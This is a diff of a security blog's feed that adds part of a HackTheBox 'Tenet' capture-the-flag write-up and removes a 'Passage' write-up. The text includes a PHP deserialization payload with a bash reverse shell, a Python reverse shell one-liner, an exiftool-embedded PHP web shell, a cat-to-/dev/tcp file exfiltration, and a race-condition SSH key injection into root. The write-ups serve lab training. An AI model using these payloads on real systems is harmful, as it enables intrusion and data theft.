+        		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;iamf.php&#39;</span>;
+                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php system(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">) ?&gt;&#34;</span>;
+        }
+}
+$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>I&rsquo;ll use this script to send that and then wait on my listener</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+serial<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>php tenetization.php<span style="color:#e6db74">`</span>
+curl -s http://10.10.10.223/sator.php?arepo<span style="color:#f92672">=</span>$serial
+sleep 5;
+curl -s http://10.10.10.223/iamf.php
+</code></pre></div><p>When I run the exploit it hangs</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ bash tenetization.sh
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
+<span style="color:#f92672">[]</span> Database updated &lt;br&gt;<span style="color:#f92672">[]</span> Database updated &lt;br&gt;
+</code></pre></div><p>But after a few seconds, I&rsquo;ve shell on my listener</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.31»
+$ nc -nvlp <span style="color:#ae81ff">443</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.223<span style="color:#f92672">]</span> <span style="color:#ae81ff">39174</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>1545<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+www-data@tenet:/var/www/html$ id
+id
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+www-data@tenet:/var/www/html$
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  /></div>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-neil">Shell as neil</h3>
+<h4 id="wp-config">WP config</h4>
+<p>I found neil&rsquo;s credentials inside the <code>wp-config.php</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
+cat wp-config.php
+&lt;?php
+...&lt;SNIP&gt;...
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database username */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;neil&#39;</span> <span style="color:#f92672">)</span>;
+
+/** MySQL database password */
+define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;Opera2112&#39;</span> <span style="color:#f92672">)</span>;
+</code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
+<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
+$ ssh neil@10.10.10.223
+neil@10.10.10.223<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-129-generic x86_64<span style="color:#f92672">)</span>
+
+...&lt;SNIP&gt;...
+
+Last login: Mon Jun <span style="color:#ae81ff">14</span> 12:57:27 <span style="color:#ae81ff">2021</span> from 10.10.16.12
+neil@tenet:~$ id
+uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>neil<span style="color:#f92672">)</span>
+</code></pre></div><p>User&rsquo;s flag is done here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ ls -l
+total <span style="color:#ae81ff">4</span>
+-r-------- <span style="color:#ae81ff">1</span> neil neil <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">14</span> 06:46 user.txt
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  /></div>
+</p>
+<hr>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="sudo-privileges">Sudo privileges</h4>
+<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> neil on tenet:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>
+
+User neil may run the following commands on tenet:
+    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
+neil@tenet:~$ 
+</code></pre></div><h4 id="analysis">Analysis</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
+-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1080</span> Dec  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> /usr/local/bin/enableSSH.sh
+neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+<span style="color:#75715e">#!/bin/bash</span>
+
+checkAdded<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+        sshName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/bin/echo $key | /usr/bin/cut -d <span style="color:#e6db74">&#34; &#34;</span> -f 3<span style="color:#66d9ef">)</span>
+
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+        <span style="color:#66d9ef">else</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+        <span style="color:#66d9ef">fi</span>
+
+<span style="color:#f92672">}</span>
+
+checkFile<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -s $1 <span style="color:#f92672">]]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[[</span> ! -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Error in creating key file!&#34;</span>
+
+                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> /bin/rm $1; <span style="color:#66d9ef">fi</span>
+
+                exit <span style="color:#ae81ff">1</span>
+
+        <span style="color:#66d9ef">fi</span>
+
+<span style="color:#f92672">}</span>
+
+addKey<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+        tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>
+
+        <span style="color:#f92672">(</span>umask 110; touch $tmpName<span style="color:#f92672">)</span>
+
+        /bin/echo $key &gt;&gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+<span style="color:#f92672">}</span>
+
+key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
+addKey
+checkAdded
+</code></pre></div><p>The value of <code>$key</code>  above will be placed temporary at <code>/tmp/SSH-randomfilename</code> before it get added into the <code>/root/.ssh/authorized_keys</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>
+neil@tenet:~$ echo $tmpName
+/tmp/ssh-4swbpcnN
+</code></pre></div><p>If the <code>$key</code> is available at <code>/root/.ssh/authorized_keys</code>, it&rsquo;ll returns a success message, if it&rsquo;s not, it&rsquo;ll return an error message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+        <span style="color:#66d9ef">else</span>
+
+                /bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+        <span style="color:#66d9ef">fi</span>
+</code></pre></div><p>It&rsquo;s a race condition.</p>
+<p>The idea here is if I overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I&rsquo;ll be able to log in as root using my private key.</p>
+<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
+<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
+<p>First, I&rsquo;ll put my public key at neil&rsquo;s home directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmW....&#39;</span> &gt; .iamf
+</code></pre></div><p>Then run this loop to make neil keep doing sudo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> sudo /usr/local/bin/enableSSH.sh; <span style="color:#66d9ef">done</span>;
+</code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span style="color:#66d9ef">while</span> sleep 0.1; <span style="color:#66d9ef">do</span> cat .iamf | tee /tmp/ssh-*;<span style="color:#66d9ef">done</span>
+</code></pre></div><p>When I see there is a &ldquo;Error in adding root@ubuntu to authorized_keys file!&rdquo; message, then I should be able to login as root.</p>
+<p>After some minutes, I can finally login as root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ ssh root@10.10.10.223
+Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-129-generic x86_64<span style="color:#f92672">)</span>
+
+...&lt;SNIP&gt;...
+
+Last login: Mon Jun <span style="color:#ae81ff">14</span> 14:33:23 <span style="color:#ae81ff">2021</span> from 10.10.16.12
+root@tenet:~# id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+root@tenet:~# ls -l
+total <span style="color:#ae81ff">4</span>
+-r-------- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">14</span> 06:46 root.txt
+root@tenet:~# 
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614213529219.png" alt="image-20210614213529219"  /></div>
+</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - ScriptKiddie</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</link>
@@ -2844,324 +3360,6 @@ uid=0(root) gid=0(root) groups=0(root)
 <li><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">https://www.youtube.com/watch?v=SN6EVIG4c-0</a></li>
 <li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
 </ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Passage</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</link>
-      <pubDate>Fri, 07 May 2021 19:30:38 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-passage/</guid>
-      <description>Leveraging USBCreator for local privilege escalation on Linux</description>
-      <content:encoded><![CDATA[<p>Passage is a medium difficulty Linux machine from HackTheBox that features a news management software called CuteNews. The software is known to be vulnerable to a remote code execution, allowing an attacker to gain a foothold on the system via the avatar upload feature. Looking into the source files of the software discovers a few password hashes that can be recovered using a dictionary attack. One of the recovered passwords can be used to escalate to the first user, and it turns out that this user is using the same SSH key as the second user. There is an unpatched package called USBCreator that allows an attacker to perform Arbitrary File Write as root without supplying a password.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>
-<p>CuteNews 2.1.2 exploitation</p>
-</li>
-<li>
-<p>USBCreator D-bus exploitation</p>
-</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-<li>Nmap - Preinstalled in Kali Linux</li>
-<li>hashcat (Windows) - <a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></li>
-<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
-<li>gdbus - Preinstalled in the target machine.</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>An initial nmap discovers two open ports, SSH on port 22 and HTTP running Apache web server on port 80.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
-$ mkdir nmap; nmap -sC -sV -oN initial-passage -v 10.10.10.206
-<span style="color:#75715e"># Nmap 7.80 scan initiated Sat Sep  5 15:39:12 2020 as: nmap -sC -sV -oN initial-passage -v 10.10.10.206</span>
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.206
-Host is up <span style="color:#f92672">(</span>0.074s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-| ssh-hostkey:
-|   <span style="color:#ae81ff">2048</span> 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
-|   <span style="color:#ae81ff">256</span> 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
-|_  <span style="color:#ae81ff">256</span> fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
-80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-|_http-title: Passage News
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div><p>As SSH usually requires credentials, I&rsquo;ll enumerate the web server on port 80.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>The page presenting a kind of news website called &ldquo;Passage News&rdquo;.</p>
-<p><div class="img-container"><img src="imgs/d7ac9042cb934e58912a75669587968e.png" alt="d7ac9042cb934e58912a75669587968e"  /></div>
-</p>
-<p>The post titled &ldquo;Implemented Fail2Ban&rdquo; states that they have implemented the Fail2Ban feature. Knowing this, I will avoid any kind of brute force attack here.</p>
-<p><div class="img-container"><img src="imgs/9eb82005d29d4c4e85aaa22c778203b0.png" alt="9eb82005d29d4c4e85aaa22c778203b0"  /></div>
-</p>
-<p>Inspecting the page sources finds a directory called &ldquo;CuteNews&rdquo;. I also find the hostname as <code>passage.htb</code>.</p>
-<p><div class="img-container"><img src="imgs/c78e8e637c114e089fc80228b7b92d20.png" alt="c78e8e637c114e089fc80228b7b92d20"  /></div>
-</p>
-<p>Adding <code>/CuteNews</code> to the URL redirects me to a login page.</p>
-<p><div class="img-container"><img src="imgs/7fa49ed1b8fc47d6ad274565962e4007.png" alt="7fa49ed1b8fc47d6ad274565962e4007"  /></div>
-</p>
-<p>I can register as normal user.</p>
-<p><div class="img-container"><img src="imgs/image-20210508014328401.png" alt="image-20210508014328401"  /></div>
-</p>
-<h4 id="searchsploit">Searchsploit</h4>
-<p>I threw &ldquo;CuteNews 2.1.2&rdquo; to <code>searchsploit</code> and it returned several exploits.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
-$ searchsploit <span style="color:#e6db74">&#39;CuteNews 2.1.2&#39;</span>
-------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                     |  Path
-------------------------------------------------------------------- ---------------------------------
-CuteNews 2.1.2 - <span style="color:#e6db74">&#39;avatar&#39;</span> Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>       | php/remote/46698.rb
-CuteNews 2.1.2 - Arbitrary File Deletion                           | php/webapps/48447.txt
-CuteNews 2.1.2 - Authenticated Arbitrary File Upload               | php/webapps/48458.txt
-------------------------------------------------------------------- ---------------------------------
-</code></pre></div><p>I&rsquo;ll go with the &lsquo;avatar&rsquo; RCE.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-www-data">Shell as www-data</h3>
-<h4 id="cutenews-cve-2019-11447">CuteNews CVE-2019-11447</h4>
-<p>It turns out the &lsquo;avatar&rsquo; RCE exploit was a CVE. The exploit module description as follows:</p>
-<blockquote>
-<p>This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
-The attacker can infiltrate the server through the avatar upload process in the profile area.
-There is no realistic control of the $imgsize function in &ldquo;/core/modules/dashboard.php&rdquo;
-Header content of the file can be changed and the control can be bypassed.
-We can use the &ldquo;GIF&rdquo; header for this process.
-An ordinary user is enough to exploit the vulnerability. No need for admin user.
-The module creates a file for you and allows RCE.</p>
-</blockquote>
-<p>I can also exploit this manually.</p>
-<p>I still have the payload that I made using <code>exiftool</code> in my previous <a href="/writeup/htb-magic">Magic write-up</a>. If I don&rsquo;t have it, I can create a new one, embedding a PHP web shell as a comment.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «passage» «10.10.14.31»
-$ exiftool -Comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
-</code></pre></div><p>I&rsquo;ll rename my jpeg image to <code>iamfr.php</code>, and then I&rsquo;ll upload it as my avatar (Dashboard &ndash;&gt; Personal Options).</p>
-<p><div class="img-container"><img src="imgs/image-20210508022032162.png" alt="image-20210508022032162"  /></div>
-</p>
-<p>The image is located at <code>http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php</code></p>
-<p><img src="imgs/image-20210508023129512.png" alt="image-20210508023129512" style="zoom:67%;" /></p>
-<p>I&rsquo;ll send a Python reverse shell through the web shell and capture it on my <code>nc</code> listener.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span style="color:#f92672">=</span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
-</code></pre></div><p>I have an interactive shell now.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
-$ rlwrap nc -nvlp <span style="color:#ae81ff">9001</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.206<span style="color:#f92672">]</span> <span style="color:#ae81ff">37062</span>
-bash: cannot set terminal process group <span style="color:#f92672">(</span>1678<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
-bash: no job control in this shell
-www-data@passage:/var/www/html/CuteNews/uploads$ id
-id
-uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-www-data@passage:/var/www/html/CuteNews/uploads$
-www-data@passage:/var/www/html/CuteNews/uploads$ export TERM<span style="color:#f92672">=</span>xterm-256color
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-paul">Shell as paul</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>There are two users in home directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
-ls -l /home
-total <span style="color:#ae81ff">8</span>
-drwxr-x--- <span style="color:#ae81ff">17</span> nadav nadav  <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">5</span> 09:21 nadav
-drwxr-x--- <span style="color:#ae81ff">17</span> paul  paul   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">5</span> 08:32 paul
-</code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
-<p><div class="img-container"><img src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  /></div>
-</p>
-<blockquote>
-<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
-</blockquote>
-<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
-</code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
-$ nc -nvlp <span style="color:#ae81ff">9000</span> &gt; cdata.users
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.206<span style="color:#f92672">]</span> <span style="color:#ae81ff">55022</span>
-</code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «passage» «10.10.14.31»
-$ cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d
-cat cdata.users| sed <span style="color:#e6db74">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> | base64 -d
